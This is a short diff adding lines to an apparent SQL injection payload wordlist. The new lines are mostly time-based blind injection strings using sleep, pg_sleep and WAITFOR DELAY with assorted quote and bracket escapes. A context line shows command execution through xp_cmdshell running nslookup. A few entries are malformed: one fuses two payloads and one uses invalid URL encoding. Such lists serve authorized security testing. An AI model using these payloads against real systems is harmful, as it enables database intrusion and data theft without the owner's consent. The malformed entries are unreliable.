@@ -284,4 +284,20 @@ t'exec master..xp_cmdshell 'nslookup www.google.com'--
 ";waitfor delay '0:0:5'--
 ');waitfor delay '0:0:5'--
 ");waitfor delay '0:0:5'--
-));waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--or sleep 5--
+or sleep 5
+or sleep(5)--
+or sleep(5)
+or SELECT pg_sleep(5);
+(SELECT pg_sleep(5))
+pg_sleep(5)--
+1 or pg_sleep(5)--
+"or pg_sleep(5)--
+'or pg_sleep(5)--
+1) or pg_sleep(5)--
+';WAITFOR DELAY '0:0:5'--
+'));waitfor delay '0:0:5'--
+"));waitfor delay '0:0:5'--
+") IF (1=1) WAITFOR DELAY '0:0:5'--
+'%3b%5waitfor%5delay%5'0%3a0%3a5'%5
+'WAITFOR DELAY '0:0:5'--
